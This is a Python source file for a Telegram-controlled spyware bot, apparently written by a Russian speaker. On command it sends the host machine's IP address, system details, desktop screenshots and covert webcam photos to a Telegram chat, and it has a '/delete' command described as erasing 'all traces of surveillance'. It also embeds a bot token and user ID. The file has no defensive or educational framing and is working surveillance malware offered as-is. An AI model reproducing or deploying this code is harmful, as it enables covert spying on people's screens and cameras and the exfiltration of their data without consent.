import telebot
from telebot import types
import requests
import cv2
import pyautogui as pg
import platform as pf
import os
 

token = '5145274029:AAFEqrP8ArsPyAVXHDBi2aJzEruD-A0BXf0'
me = 1480501620
bot = telebot.TeleBot(token)

@bot.message_handler(commands=["start"])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ["/ip", "/pc", "/screenshot", "/webcam", "/info", "/delete"]
 
    for button in buttons:
        markup.add(types.KeyboardButton(button))

    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)

@bot.message_handler(commands=["info"])
def info(message):
	bot.send_message(message.chat.id,'/ip - Узнать IP-адрес\n\n/pc - Хар-ка ПК\n\n/screenshot - скрин экрана\n\n/webcam - фото с камеры\n\n/delete - удалить все следы слежки')


@bot.message_handler(commands=["ip"])
def ip_address(message):
    response = requests.get("http://jsonip.com/").json()
    bot.send_message(message.chat.id, f"IP Address: {response['ip']}")


@bot.message_handler(commands=["pc"])
def pc(message):
    info_pc = f"Name PC: {pf.node()}\n\nProcessor: {pf.processor()}\n\nSystem: {pf.system()} {pf.release()}"
    bot.send_message(message.chat.id, info_pc)


@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    pg.screenshot("scr.jpg")
 
    with open("scr.jpg", "rb") as img:
        bot.send_photo(message.chat.id, img)
    os.remove('scr.jpg')


@bot.message_handler(commands=["webcam"])
def webcam(message):
	try:
	    cap = cv2.VideoCapture(0)
	 
	    for i in range(30):
	        cap.read()
	 
	    ret, frame = cap.read()
	 
	    cv2.imwrite("cam.jpg", frame)
	    cap.release()
	 
	    with open("cam.jpg", "rb") as img:
	        bot.send_photo(message.chat.id, img)
	    os.remove('cam.jpg')
	except:
		bot.send_message(message.chat.id, 'Ошибка WebCam')


@bot.message_handler(commands=["delete"])
def delete(message):
	os.system('Support.vbs')



bot.polling(none_stop=True)